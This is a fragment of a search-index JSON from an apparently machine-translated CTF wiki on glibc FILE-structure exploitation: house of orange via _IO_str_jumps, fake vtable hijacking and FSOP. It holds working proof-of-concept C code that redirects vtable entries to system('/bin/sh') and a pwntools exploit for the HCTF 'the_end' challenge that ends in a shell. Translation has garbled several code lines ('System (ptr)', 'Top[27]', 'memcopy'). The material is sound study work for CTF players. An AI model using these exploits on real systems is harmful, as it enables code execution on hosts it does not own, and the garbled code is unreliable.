fp-&gt;_flags &amp; _IO_NO_WRITES is false</li> <li> <p><code>2. (pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></p> </li> <li> <p>`3. fp-&gt;_flags &amp; _IO_USER_BUF(0x01) is false.</p> </li> <li>`4. 2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 cannot be negative</li> <li>`5. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; should point to the address corresponding to the /bin/sh string.</li> <li>`6. fp+0xe0 points to the system address.</li> </ol> <p>structure:</p> <pre><code>_flags = 0\n\n_IO_write_base = 0\n\n_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1\n\n_IO_buf_end = (binsh_in_libc_addr -100) / 2 \n\n\n\n_freeres_list = 0x2\n_freeres_buf = 0x3\n_mode = -1\n\n\n\nvtable = _IO_str_jumps - 0x18\n</code></pre>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#example_1","title":"Example","text":"<p>Modified how2heap's houseoforange code, you can debug it yourself.</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;string.h&gt;\n\nint winner ( char *ptr);\n\nint main()\n\n{\n\n    char *p1, *p2;\n\n    size_t io_list_all, *top;\n\n    // unsorted bin attack\n\n    p1 = malloc(0x400-16);\n\n    top = (size_t *) ( (char *) p1 + 0x400 - 16);\n\n    top[1] = 0xc01;\n\n    p2 = malloc(0x1000);\n\n    io_list_all = top[2] + 0x9a8;\n\n    top[3] = io_list_all - 0x10;\n\n    // _IO_str_overflow conditions\n\n    char binsh_in_libc[] = \"/bin/sh\\x00\"; // we can found \"/bin/sh\" in libc, here i create it in stack\n\n    // top[0] = ~1;\n\n    // top[0] &amp;= ~8;\n\n    top[0] = 0;\n\n    top[4] = 0; // write_base\n\n    top[5] = ((size_t)&amp;binsh_in_libc-100)/2 + 1; // write_ptr\n\n    top[7] = 0; // buf_base\n\n    top[8] = top[5] - 1; // buf_end\n\n    // house_of_orange conditions\n    top[1] = 0x61;\n\n\n\n    top[20] = (size_t) &amp;top[18];\n\n    top[21] = 2;\n\n    top[22] = 3;\n\n    top[24] = -1;\n\nTop[27] = (size_t)stdin - 0x3868-0x18; // _IO_str_jumps address\n    top[28] = (size_t) &amp;winner;\n\n\n\n    /* Finally, trigger the whole chain by calling malloc */\n\n    malloc(10);\n\n    return 0;\n\n}\n\nint winner(char *ptr)\n\n{ \n\nSystem (ptr);\n    return 0;\n\n}\n</code></pre>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish","title":"_IO_str_jumps -&gt; finish","text":"<p>The principle is similar to _IO_str_jumps -&gt; overflow above</p> <pre><code>void\n\n_IO_str_finish (_IO_FILE * fp, int dummy)\n{\n\n  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))\n\n    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]\n\nfp -&amp;gt; _ IO_buf_base = NULL;\n\n\n  _IO_default_finish (fp, 0);\n\n}\n</code></pre> <p>condition:</p> <ol> <li>_IO_buf_base is not empty</li> <li>_flags &amp; _IO_USER_BUF(0x01) is false</li> </ol> <p>Constructed as follows:</p> <pre><code>_flags = (binsh_in_libc + 0x10) &amp; ~1\n\n_IO_buf_base = binsh_addr\n\n\n\n_freeres_list = 0x2\n_freeres_buf = 0x3\n_mode = -1\n\nvtable = _IO_str_finish - 0x18\n\nfp+0xe8 -&gt; system_addr\n</code></pre>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#example_2","title":"Example","text":"<p>Modified how2heap's houseoforange code, you can debug it yourself.</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;string.h&gt;\n\nint winner ( char *ptr);\n\nint main()\n\n{\n\n    char *p1, *p2;\n\n    size_t io_list_all, *top;\n\n    // unsorted bin attack\n\n    p1 = malloc(0x400-16);\n\n    top = (size_t *) ( (char *) p1 + 0x400 - 16);\n\n    top[1] = 0xc01;\n\n    p2 = malloc(0x1000);\n\n    io_list_all = top[2] + 0x9a8;\n\n    top[3] = io_list_all - 0x10;\n\n    // _IO_str_finish conditions\n\n    char binsh_in_libc[] = \"/bin/sh\\x00\"; // we can found \"/bin/sh\" in libc, here i create it in stack\n\n\n\n    top[0] = ((size_t) &amp;binsh_in_libc + 0x10) &amp; ~1;\n\n    top[7] = ((size_t)&amp;binsh_in_libc); // buf_base\n\n\n\n    // house_of_orange conditions\n\n    top[1] = 0x61;\n\n    top[5] = 0x1 ; //_IO_write_ptr\n\n    top[20] = (size_t) &amp;top[18];\n\n    top[21] = 2;\n\n    top[22] = 3;\n\n    top[24] = -1;\n\n    top[27] = (size_t) stdin - 0x33f0 - 0x18;\n\n    top[29] = (size_t) &amp;winner;\n\n        top[30] = (size_t) &amp;top[30];\n\n    malloc(10);\n\n    return 0;\n\n}\n\nint winner(char *ptr)\n\n{ \n\nSystem (ptr);\n    return 0;\n\n}\n</code></pre>"},{"location":"pwn/linux/io_file/fake-vtable-exploit/","title":"\u5047\u9020vtable hijack program flow","text":""},{"location":"pwn/linux/io_file/fake-vtable-exploit/#introduction","title":"Introduction","text":"<p>Earlier we introduced the file stream feature (FILE) in Linux. We can see that some common IO operation functions in Linux need to be processed through the FILE structure. In particular, there is a vtable in the _IO_FILE_plus structure, and some functions will fetch the pointers in the vtable for calling.</p> <p>Therefore, the central idea of the fake vtable hijacking process is to implement the vtable of _IO_FILE_plus by pointing the vtable to the memory we control and placing the function pointer in it.</p> <p>Therefore, vtable hijacking is divided into two types. One is to directly rewrite the function pointer in the vtable, which can be realized by writing at any address. The other is to overwrite the vtable pointer to the memory we control, and then arrange the function pointer in it.</p>"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#practice","title":"Practice","text":"<p>Here is a demonstration of the pointer in the vtable, first need to know where _IO_FILE_plus is located, in the case of fopen is located in the heap memory, for stdin\\stdout\\stderr is located in libc.so.</p> <pre><code>int main(void)\n\n{\n\n    FILE *fp;\n\n    long long *vtable_ptr;\n\n    fp=fopen(\"123.txt\",\"rw\");\n\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n\n\n    vtable_ptr[7]=0x41414141 //xsputn\n\n\n\n    printf(\"call 0x41414141\");\n\n}\n</code></pre> <p>The address of the vtable is obtained according to the offset of the vtable at _IO_FILE_plus, and the offset is 0xd8 under the 64-bit system. After that, you need to find out which function in the vtable is called by the IO function to be hijacked. About the IO function call vtable has been given in the FILE structure introduction section, know that printf will call xsputn in the vtable, and xsputn is the eighth item in the vtable can be written to this pointer for hijacking.</p> <p>And when the vtable function such as xsputn is called, the first parameter passed in is actually the corresponding IO_FILE_plus address. For example, this example calls printf, and the first parameter passed to the vtable is the address of _IO_2_1_stdout.</p> <p>Use this to pass arguments to the hijacked vtable function, such as</p> <pre><code>#define system_ptr 0x7ffff7a52390;\n\n\nint main(void)\n\n{\n\n    FILE *fp;\n\n    long long *vtable_ptr;\n\n    fp=fopen(\"123.txt\",\"rw\");\n\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n\n\n    memcopy(fp,\"sh\",3);\n\n\n\nvtable_ptr [7] = system_ptr // xsputn\n\n\n\n\n    fwrite(\"hi\",2,1,fp);\n\n}\n</code></pre> <p>However, under the current libc2.23 version, the vtable located in the libc data segment cannot be written. However, it can still be exploited by forging vtables in controllable memory.</p> <pre><code>#define system_ptr 0x7ffff7a52390;\n\n\nint main(void)\n\n{\n\n    FILE *fp;\n\n    long long *vtable_addr,*fake_vtable;\n\n\n\n    fp=fopen(\"123.txt\",\"rw\");\n\n    fake_vtable=malloc(0x40);\n\n\n\n    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset\n\n\n\n    vtable_addr[0]=(long long)fake_vtable;\n\n\n\n    memcpy(fp,\"sh\",3);\n\n\n\n    fake_vtable[7]=system_ptr; //xsputn\n\n\n\n    fwrite(\"hi\",2,1,fp);\n\n}\n</code></pre> <p>We first allocate a memory to store the fake vtable, then modify the _IO_FILE_plus vtable pointer to point to this memory. Because the pointer in the vtable we are placing the address of the system function, we need to pass the parameter \"/bin/sh\" or \"sh\".</p> <p>Because the function in the vtable will call the corresponding _IO_FILE_plus pointer as the first parameter, so here we write \"sh\" to the _IO_FILE_plus header. Subsequent calls to fwrite will execute system(\"sh\") via our fake vtable.</p> <p>Similarly, if _IO_FILE created by fopen and other functions does not exist in the program, you can also select _IO_FILE located in libc.so such as stdin\\stdout\\stderr. These streams will be used in functions such as printf\\scanf. Prior to libc2.23, these vtables were writable and there were no other tests.</p> <pre><code>print &amp;amp; _IO_2_1_stdin_\n$ 2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &amp;lt;_IO_2_1_stdin_&amp;gt;\n\n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n</code></pre>"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#2018-hctf-the_end","title":"2018 HCTF the_end","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/)</p>"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#basic-information","title":"Basic Information","text":"<pre><code>void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)\n\n{\n\n  signed int i; // [rsp+4h] [rbp-Ch]\n\n  void *buf; // [rsp+8h] [rbp-8h]\n\n\n\n  sleep(0);\n\n  printf(\"here is a gift %p, good luck ;)\\n\", &amp;sleep);\n\n  fflush(_bss_start);\n\n  close(1);\n\n  close(2);\n\n  for ( i = 0; i &lt;= 4; ++i )\n\n  {\n\n    read(0, &amp;buf, 8uLL);\n\n    read(0, buf, 1uLL);\n\n  }\n\n  exit(1337);\n\n}\n</code></pre> <p>Analyze the problem, using the point is very clear in the main function, and:</p> <ul> <li>In addition to canary protection</li> <li>libc base address and libc version</li> <li>Ability to write 5 bytes anywhere</li> </ul>"},{"location":"pwn/linux/io_file/fake-vtable-exploit/#ideas","title":"Ideas:","text":"<ul> <li>Utilizing the program to call <code>exit</code>, it will traverse <code>_IO_list_all</code> and call the <code>_setbuf</code> function in <code>vatable</code> under <code>_IO_2_1_stdout_</code>.</li> <li>You can modify two bytes to forge a <code>fake_vtable</code> near the current <code>vtable</code> and then use 3 bytes to modify the contents of <code>_setbuf</code> in <code>fake_vtable</code> to <code>one_gadget</code>.</li> </ul> <p>We first debug to find the offset of <code>_IO_2_1_stdout_</code> and libc. The stupid thing here is that I originally searched for related symbols in gdb, but in fact the address found is the location of the symbol <code>_IO_2_1_stdout_</code>, not its The location on the libc data segment, we use the ida or libcsearch tool to find the <code>vtables</code> offset <code>0x3C56F8</code> as follows:</p> <pre><code>.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables\n\n.data:00000000003C5700                 public stderr\n\n.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_\n\n.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0\u2191o\n\n.data:00000000003C5700                                         ; fclose+F2\u2191r ...\n\n.data:00000000003C5708                 public stdout\n\n.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_\n\n.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48\u2191o\n\n.data:00000000003C5708                                         ; fclose+E9\u2191r ...\n\n.data:00000000003C5710                 public stdin\n\n.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_\n\n.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8\u2191o\n\n.data:00000000003C5710                                         ; fclose:loc_6D340\u2191r ...\n\n.data:00000000003C5718                 dq offset sub_20B70\n\n.data:00000000003C5718 _data           ends\n\n.data:00000000003C5718\n\n.bss:00000000003C5720 ; ===========================================================================\n</code></pre> <p>Let's look at the contents of the virtual table:</p> <pre><code>pwndbg&gt; x /30gx 0x7f41d9c026f8\n\n0x7f41d9c026f8 &amp;lt;_IO_2_1_stdout_ + 216&amp;gt;: 0x00007f41d9c006e0 0x00007f41d9c02540\n0x7f41d9c02708 &lt;stdout&gt;:    0x00007f41d9c02620  0x00007f41d9c018e0\n\n0x7f41d9c02718 &lt;DW.ref.__gcc_personality_v0&gt;:   0x00007f41d985db70  0x0000000000000000\n\n0x7f41d9c02728 &lt;string_space&gt;:  0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02738 &amp;lt;__ printf_va_arg_table&amp;gt;: 0x0000000000000000 0x0000000000000000\n0x7f41d9c02748 &lt;transitions&gt;:   0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02758 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02768 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02778 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02788 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02798 &lt;getttyname_name&gt;:   0x0000000000000000  0x0000000000000000\n\n0x7f41d9c027a8 &lt;fcvt_bufptr&gt;:   0x0000000000000000  0x0000000000000000\n\n0x7f41d9c027b8 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c027c8 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c027d8 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n</code></pre> <p>Then at this time look for a <code>fake_vtable</code> near the virtual table, the following conditions must be met:</p> <ul> <li> <p><code>fake_vtable_addr</code> + 0x58 = <code>libc_base</code> + <code>off_set_3</code></p> </li> <li> <p>where 0x58 is checked according to the table below is the offset of <code>set_buf</code> in the virtual table</p> </li> </ul> <pre><code>void * funcs[] = {\n\n1 NULL, // \"extra word\"\n\n2 NULL, // DUMMY\n\n3 exit, // finish\n\n4 NULL, // overflow\n\n5 NULL, // underflow\n\n6 NULL, // uflow\n\n7 NULL, // pbackfail\n\n8 NULL, // xsputn #printf\n\n9 NULL, // xsgetn\n10 NULL, // seekoff\n11 NULL, // seekpos\n\n12 NULL, // setbuf\n13 NULL, // sync\n\n14 NULL, // target location\n15 NULL, // read\n\n16 NULL, // write\n\n17 NULL, // seek\n\n18 pwn, // close\n\n19 NULL, // stat\n\n20 NULL, // showmanyc\n\n21 NULL, // imbue\n\n};\n</code></pre> <p>I chose the following address as <code>fake_vtable</code> here:</p> <pre><code>pwndbg&gt; x /60gx 0x7f41d9c02500\n\n0x7f41d9c02500 &lt;_nl_global_locale+224&gt;: 0x00007f41d99cb997  0x0000000000000000\n\n0x7f41d9c02510: 0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02520 &lt;_IO_list_all&gt;:  0x00007f41d9c02540  0x0000000000000000\n\n0x7f41d9c02530: 0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02540 &lt;_IO_2_1_stderr_&gt;:   0x00000000fbad2086  0x0000000000000000\n\n0x7f41d9c02550 &lt;_IO_2_1_stderr_+16&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02560 &lt;_IO_2_1_stderr_+32&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02570 &lt;_IO_2_1_stderr_+48&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02580 &lt;_IO_2_1_stderr_+64&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02590 &lt;_IO_2_1_stderr_+80&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c025a0 &lt;_IO_2_1_stderr_+96&gt;:    0x0000000000000000  0x00007f41d9c02620\n\n0x7f41d9c025b0 &lt;_IO_2_1_stderr_+112&gt;:   0x0000000000000002  0xffffffffffffffff\n\n0x7f41d9c025c0 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000  0x00007f41d9c03770\n\n0x7f41d9c025d0 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff  0x0000000000000000\n\n0x7f41d9c025e0 &lt;_IO_2_1_stderr_+160&gt;:   0x00007f41d9c01660  0x0000000000000000\n\n0x7f41d9c025f0 &lt;_IO_2_1_stderr_+176&gt;:   0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02600 &lt;_IO_2_1_stderr_+192&gt;:   0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02610 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000  0x00007f41d9c006e0\n\n0x7f41d9c02620 &lt;_IO_2_1_stdout_&gt;:   0x00000000fbad2a84  0x00005582e351c010\n\n0x7f41d9c02630 &lt;_IO_2_1_stdout_+16&gt;:    0x00005582e351c010  0x00005582e351c010\n\n0x7f41d9c02640 &lt;_IO_2_1_stdout_+32&gt;:    0x00005582e351c010  0x00005582e351c010\n\n0x7f41d9c02650 &lt;_IO_2_1_stdout_+48&gt;:    0x00005582e351c010  0x00005582e351c010\n\n0x7f41d9c02660 &lt;_IO_2_1_stdout_+64&gt;:    0x00005582e351c410  0x0000000000000000\n\n0x7f41d9c02670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7f41d9c02680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000  0x00007f41d9c018e0\n\n0x7f41d9c02690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001  0xffffffffffffffff\n\n0x7f41d9c026a0 &lt;_IO_2_1_stdout_+128&gt;:   0x0000000000000000  0x00007f41d9c03780\n\n0x7f41d9c026b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff  0x0000000000000000\n\n0x7f41d9c026c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007f41d9c017a0  0x0000000000000000\n\n0x7f41d9c026d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000  0x0000000000000000\n\npwndbg&gt; distance 0x7f41d9c025e0 0x7f41d983d000\n\n0x7f41d9c025e0-&gt;0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words)\n\npwndbg&gt; p 0x7f41d9c025e0 -0x58\n\n$10 = 0x7f41d9c02588\n\npwndbg&gt; distance 0x7f41d9c02588 0x7f41d983d000\n\n0x7f41d9c02588-&gt;0x7f41d983d000 is -0x3c5588 bytes (-0x78ab1 words)\n\npwndbg&gt; distance  0x7f41d9c025e0 0x7f41d983d000\n\n0x7f41d9c025e0-&gt;0x7f41d983d000 is -0x3c55e0 bytes (-0x78abc words)\n</code></pre> <p>The final exploit script is as follows:</p> <pre><code>from pwn import *\n\ncontext.log_level=\"debug\"\n\n\n\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\n# p = process('the_end')\n\np = remote('127.0.0.1',1234)\n\n\n\nto = 0\nif rem ==1:\n\n    p = remote('150.109.44.250',20002)\n\n    p.recvuntil('Input your token:')\n\np.sendline ( &amp;#39;RyyWrOLHepeGXDy6g9gJ5PnXsBfxQ5uU&amp;#39;)\n\n\nsleep_ad = p.recvuntil(', good luck',drop=True).split(' ')[-1]\n\n\n\nlibc_base = long(sleep_ad,16) - libc.symbols['sleep']\n\none_gadget = libc_base + 0xf02b0\n\nvtables =     libc_base + 0x3C56F8\n\n\n\nfake_vtable = libc_base + 0x3c5588\n\ntarget_addr = libc_base + 0x3c55e0\n\n\n\nprint 'libc_base: ',hex(libc_base)\n\nprint 'one_gadget:',hex(one_gadget)\n\nprint 'exit_addr:',hex(libc_base + libc.symbols['exit'])\n\n\n\n# gdb.attach(p)\n\n\n\nfor i in range(2):\n\n    p.send(p64(vtables+i))\n\n    p.send(p64(fake_vtable)[i])\n\n\n\n\n\nfor i in range(3):\n\n    p.send(p64(target_addr+i))\n\n    p.send(p64(one_gadget)[i])\n\n\n\np.sendline(\"exec /bin/sh 1&gt;&amp;0\")\n\n\n\np.interactive()\n</code></pre>"},{"location":"pwn/linux/io_file/fsop/","title":"FSOP","text":""},{"location":"pwn/linux/io_file/fsop/#introduction","title":"Introduction","text":"<p>FSOP is the abbreviation of File Stream Oriented Programming. According to the previous introduction to FILE, all the _IO_FILE structures in the process will be connected to each other using the _chain field to form a linked list. The header of this linked list is maintained by _IO_list_all.</p> <p>The core idea of the FSOP is to hijack the value of _IO_list_all to fake the linked list and the _IO_FILE entry, but pure forgery just constructs the data and needs some way to trigger. The trigger method for FSOP selection is to call _IO_flush_all_lockp. This function will refresh the file stream of all items in the _IO_list_all list, which is equivalent to calling fflush for each FILE, and correspondingly calling _IO_overflow in _IO_FILE_plus.vtable.</p> <pre><code>int\n\n_IO_flush_all_lockp (int do_lock)\n\n{\n\n  ...\n\nfp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n\n  {\n\n       ...\n\n       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))\n\n               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n\n           {\n\n               result = EOF;\n\n          }\n\n        ...\n\n  }\n\n}\n</code></pre> <p></p> <p>_IO_flush_all_lockp does not require an attacker to manually invoke it. In some cases this function will be called by the system:</p> <ol> <li> <p>When libc executes the abort process</p> </li> <li> <p>When executing the exit function</p> </li> <li> <p>When the execution flow returns from the main function</p> </li> </ol>"},{"location":"pwn/linux/io_file/fsop/#example","title":"example","text":"<p>To sort out the conditions used by the FSOP, the attacker first needs to know the libc.so base address, because _IO_list_all is stored as a global variable in libc.so, and _IO_list_all cannot be overwritten without leaking the libc base address.</p> <p>Then you need to use any address to write the contents of _IO_list_all to pointers to our controllable memory.</p> <p>The next question is what data is placed in the controllable memory, and there is no doubt that we need to lay out a vtable pointer to our ideal function. But in order for the fake_FILE we constructed to work properly, we need to lay out some other data. The basis here is the one we gave earlier.</p> <pre><code>if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))\n\n               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n\n           {\n\n               result = EOF;\n\n          }\n</code></pre> <p>That is</p> <ul> <li> <p>fp-&gt;_mode &lt;= 0</p> </li> <li> <p>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p> </li> </ul> <p>Here we verify this with an example. First we allocate a block of memory for the fake vtable and _IO_FILE_plus. In order to bypass the verification, we get the offset of the data fields such as _IO_write_ptr, _IO_write_base, _mode in advance, so that the corresponding data can be constructed in the forged vtable.</p> <pre><code>#define _IO_list_all 0x7ffff7dd2520\n\n#define mode_offset 0xc0\n\n#define writeptr_offset 0x28\n\n#define writebase_offset 0x20\n\n#define vtable_offset 0xd8\n\n\n\nint main(void)\n\n{\n\nvoid * ptr;\n    long long *list_all_ptr;\n\n\n\nptr = malloc (0x200);\n\n\n    *(long long*)((long long)ptr+mode_offset)=0x0;\n\n    *(long long*)((long long)ptr+writeptr_offset)=0x1;\n\n    *(long long*)((long long)ptr+writebase_offset)=0x0;\n\n    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);\n\n\n\n    *(long long*)((long long)ptr+0x100+24)=0x41414141;\n\n\n\n    list_all_ptr=(long long *)_IO_list_all;\n\n\n\n    list_all_ptr[0]=ptr;\n\n\n\n    exit(0);\n\n}\n</code></pre> <p>We use the first 0x100 bytes of allocated memory as _IO_FILE, the last 0x100 bytes as vtable, and the 0x41414141 address in the vtable as the fake _IO_overflow pointer.</p> <p>After that, overwrite the global variable _IO_list_all in libc and point it to our fake _IO_FILE_plus.</p> <p>By calling the exit function, the program will execute _IO_flush_all_lockp, get the value of _IO_list_all via fflush and retrieve the _IO_overflow called as _IO_FILE_plus.</p> <pre><code>---&gt; call _IO_overflow\n\n[#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0)\n\n[#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup()\n\n[#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=0x1)\n\n[#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=&lt;optimized out&gt;)\n\n[#4] 0x4005ce \u2192 Name: main()\n</code></pre>"},{"location":"pwn/linux/io_file/introduction/","title":"FILE\u7ed3\u6784","text":""},{"location":"pwn/linux/io_file/introduction/#file-introduction","title":"FILE Introduction","text":"<p>FILE is a structure for describing files in a standard IO library of a Linux system, called a file stream. The FILE structure is created when the program executes functions such as fopen and is allocated in the heap. We often define a pointer to the FILE structure to receive this return value.</p> <p>The FILE structure is defined in libio.h as shown below</p> <pre><code>struct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n\n#define _IO_file_flags _flags\n\n\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n\n  char* _IO_read_ptr;   /* Current read pointer */\n\n  char* _IO_read_end;   /* End of get area. */\n\n  char* _IO_read_base;  /* Start of putback+get area. */\n\n  char* _IO_write_base; /* Start of put area. */\n\n  char* _IO_write_ptr;  /* Current put pointer. */\n\n  char* _IO_write_end;  /* End of put area. */\n\n  char* _IO_buf_base;   /* Start of reserve area. */\n\n  char* _IO_buf_end;    /* End of reserve area. */\n\n  /* The following fields are used to support backing up and undo. */\n\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n\n\n  struct _IO_marker *_markers;\n\n\n\n  struct _IO_FILE *_chain;\n\n\n\n  int _fileno;\n\n#if 0\n\n  int _blksize;\n\n#else\n\n  int _flags2;\n\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n\n\n#define __HAVE_COLUMN /* temporary */\n\n  /* 1+column number of pbase(); 0 is unknown. */\n\n  unsigned short _cur_column;\n\n  signed char _vtable_offset;\n\n  char _shortbuf[1];\n\n\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n\n\n  _IO_lock_t *_lock;\n\n#ifdef _IO_USE_OLD_IO_FILE\n\n};\n</code></pre> <p>The FILE structure in the process will be connected to each other through the _chain field to form a linked list. The linked list header is represented by the global variable _IO_list_all. Through this value, we can traverse all the FILE structures.</p> <p>In the standard I/O library, three file streams are automatically opened at the start of each program: stdin, stdout, stderr. So in the initial state, _IO_list_all points to a linked list of these file streams, but it should be noted that these three file streams are located in the data segment of libc.so. The file stream we created with fopen is allocated on the heap memory.</p> <p>We can find stdin\\stdout\\stderr and other symbols in libc.so, these symbols are pointers to the FILE structure, the symbol of the real structure is</p> <pre><code>_IO_2_1_stderr_\n_IO_2_1_stdout_\n_IO_2_1_stdin_\n</code></pre> <p>But in fact the _IO_FILE structure is wrapped around another structure _IO_FILE_plus, which contains an important pointer vtable pointing to a series of function pointers.</p> <p>In libc2.23, the 32-bit vtable offset is 0x94 and the 64-bit offset is 0xd8.</p> <pre><code>struct _IO_FILE_plus\n{\n\n_IO_FILE file;\n    IO_jump_t   *vtable;\n\n}\n</code></pre> <p>Vtable is a pointer of type IO_jump_t, and some function pointers are stored in IO_jump_t. Later we will see that these function pointers are called in a series of standard IO functions.</p> <pre><code>void\u00a0*\u00a0funcs[]\u00a0=\u00a0{\n\n\u00a0\u00a0\u00a01\u00a0NULL,\u00a0//\u00a0\"extra\u00a0word\"\n\n\u00a0\u00a0\u00a02\u00a0NULL,\u00a0//\u00a0DUMMY\n\n\u00a0\u00a0\u00a03\u00a0exit,\u00a0//\u00a0finish\n\n\u00a0\u00a0\u00a04\u00a0NULL,\u00a0//\u00a0overflow\n\n\u00a0\u00a0\u00a05\u00a0NULL,\u00a0//\u00a0underflow\n\n\u00a0\u00a0\u00a06\u00a0NULL,\u00a0//\u00a0uflow\n\n\u00a0\u00a0\u00a07\u00a0NULL,\u00a0//\u00a0pbackfail\n\n\u00a0\u00a0\u00a0\n\n\u00a0\u00a0\u00a08\u00a0NULL,\u00a0//\u00a0xsputn  #printf\n\n9 NULL, // xsgetn\n10 NULL, // seekoff\n\u00a0\u00a0\u00a011\u00a0NULL,\u00a0//\u00a0seekpos\n\n12 NULL, // setbuf\n\u00a0\u00a0\u00a013\u00a0NULL,\u00a0//\u00a0sync\n\n14 NULL, // target location\n\u00a0\u00a0\u00a015\u00a0NULL,\u00a0//\u00a0read\n\n\u00a0\u00a0\u00a016\u00a0NULL,\u00a0//\u00a0write\n\n\u00a0\u00a0\u00a017\u00a0NULL,\u00a0//\u00a0seek\n\n\u00a0\u00a0\u00a018\u00a0pwn,\u00a0\u00a0//\u00a0close\n\n\u00a0\u00a0\u00a019\u00a0NULL,\u00a0//\u00a0stat\n\n\u00a0\u00a0\u00a020\u00a0NULL,\u00a0//\u00a0showmanyc\n\n\u00a0\u00a0\u00a021\u00a0NULL,\u00a0//\u00a0imbue\n\n};\n</code></pre>"},{"location":"pwn/linux/io_file/introduction/#fread","title":"fread","text":"<p>Fread is a standard IO library function that reads data from a file stream. The function prototype is as follows</p> <pre><code>size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;\n</code></pre> <ul> <li> <p>buffer Holds the buffer for reading data.</p> </li> <li> 